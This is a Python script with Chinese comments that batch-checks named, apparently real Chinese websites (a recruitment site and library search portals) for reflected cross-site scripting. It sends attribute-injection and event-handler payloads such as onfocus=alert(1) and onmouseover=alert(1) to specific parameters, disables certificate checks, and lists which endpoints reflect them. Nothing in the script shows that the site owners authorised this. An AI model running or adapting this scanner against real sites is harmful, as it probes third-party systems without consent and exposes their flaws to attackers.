#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS 标签注入漏洞批量验证
"""

import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 测试用例
TESTS = [
    # === www.hjrc.cn ===
    {
        "name": "hjrc.cn - search.asp ckey2参数",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "2", "txtitle": "testtest", "key": "1",
                   "ckey2": '1 web_xss_in_tag=85f7210c blah=',
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn - search.asp txtitle参数",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": 'test web_xss_in_tag=85f7210c blah=',
                   "key": "1", "ckey2": "1", "szhiwei": "1", "area": "1", "keytype": "1"},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn - search.asp page参数",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": '2 web_xss_in_tag=85f7210c blah=',
                   "txtitle": "test", "key": "1", "ckey2": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn - rsnews/news_list.asp",
        "url": "http://www.hjrc.cn/rsnews/news_list.asp",
        "params": {"id": '1 web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn - bio_list.asp id参数",
        "url": "http://www.hjrc.cn/content/bio_list.asp",
        "params": {"id": '1 web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    # === www.hjlib.cn:8088 ===
    {
        "name": "hjlib.cn - oldNavigationFacet.do",
        "url": "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"keyword": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjlib.cn - oldNavigationFacet.do q参数",
        "url": "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"q": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjlib.cn - newNavigationFacet.do",
        "url": "http://www.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"keyword": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "hjlib.cn - newNavigationFacet.do q参数",
        "url": "http://www.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"q": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    # === thg.hjlib.cn:8088 ===
    {
        "name": "thg.hjlib.cn - oldNavigationFacet.do",
        "url": "http://thg.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"keyword": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "thg.hjlib.cn - oldNavigationFacet.do q参数",
        "url": "http://thg.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"q": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "thg.hjlib.cn - newNavigationFacet.do",
        "url": "http://thg.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"keyword": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    {
        "name": "thg.hjlib.cn - newNavigationFacet.do q参数",
        "url": "http://thg.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"q": 'test web_xss_in_tag=85f7210c blah='},
        "tag": "web_xss_in_tag"
    },
    # === 额外的标签注入测试 ===
    {
        "name": "hjrc.cn - search.asp onfocus注入",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "ckey2": '" onfocus=alert(1) autofocus="',
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "tag": "onfocus"
    },
    {
        "name": "hjlib.cn - oldNav style注入",
        "url": "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"keyword": '" onmouseover=alert(1) x="'},
        "tag": "onmouseover"
    },
    {
        "name": "thg.hjlib.cn - oldNav style注入",
        "url": "http://thg.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"keyword": '" onmouseover=alert(1) x="'},
        "tag": "onmouseover"
    },
]

print("=" * 70)
print("  XSS 标签注入漏洞 - 批量验证")
print("=" * 70)
print()

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

vuln_count = 0
vuln_list = []

for i, test in enumerate(TESTS):
    print(f"[{i+1}/{len(TESTS)}] {test['name']}")
    print(f"  URL: {test['url']}")

    params_str = "&".join(f"{k}={v}" for k, v in test["params"].items())
    print(f"  参数: {params_str[:100]}")

    try:
        resp = session.get(test["url"], params=test["params"], timeout=15, verify=False)
        body = resp.text

        is_vuln = False

        # 检查tag是否在HTML标签属性中被反射
        if test["tag"] in body:
            # 找到tag出现的位置，检查上下文
            idx = body.find(test["tag"])
            context = body[max(0, idx-80):idx+len(test["tag"])+80]

            # 检查是否在HTML标签属性内
            if "=" in test["params"].get(list(test["params"].keys())[0], ""):
                # 标签属性注入
                is_vuln = True
                print(f"  状态: ✅ 标签属性注入成功 (Payload在标签属性中反射)")
                print(f"  上下文: ...{context[:120]}...")
            else:
                is_vuln = True
                print(f"  状态: ✅ 存在漏洞 (Payload原样反射)")
                print(f"  上下文: ...{context[:120]}...")

        # 检查通用XSS标签
        elif any(kw in body for kw in ["onfocus=", "onmouseover=", "onerror=", "onload="]):
            is_vuln = True
            print(f"  状态: ✅ 存在漏洞 (事件处理标签反射)")

        elif resp.status_code == 200:
            print(f"  状态: ❌ Payload未反射或被过滤 (200)")
        elif resp.status_code == 404:
            print(f"  状态: ❌ 路径不存在 (404)")
        elif resp.status_code == 503 or resp.status_code == 502:
            print(f"  状态: ⚠️  服务不可用 ({resp.status_code})")
        else:
            print(f"  状态: ❌ HTTP {resp.status_code}")

        if is_vuln:
            vuln_count += 1
            vuln_list.append(test["name"])

    except requests.exceptions.Timeout:
        print(f"  状态: ⏱️  超时")
    except requests.exceptions.ConnectionError:
        print(f"  状态: ❌ 连接失败")
    except Exception as e:
        print(f"  状态: ❌ 异常: {e}")

    print()
    time.sleep(0.3)

print("=" * 70)
print(f"  验证结果汇总")
print("=" * 70)
print()
print(f"  总测试数: {len(TESTS)}")
print(f"  ✅ 存在漏洞: {vuln_count} 个")
print(f"  ❌ 不存在/已过滤: {len(TESTS) - vuln_count} 个")
print()

if vuln_list:
    print("  漏洞列表:")
    for i, name in enumerate(vuln_list):
        print(f"    {i+1}. {name}")

print()
print("=" * 70)
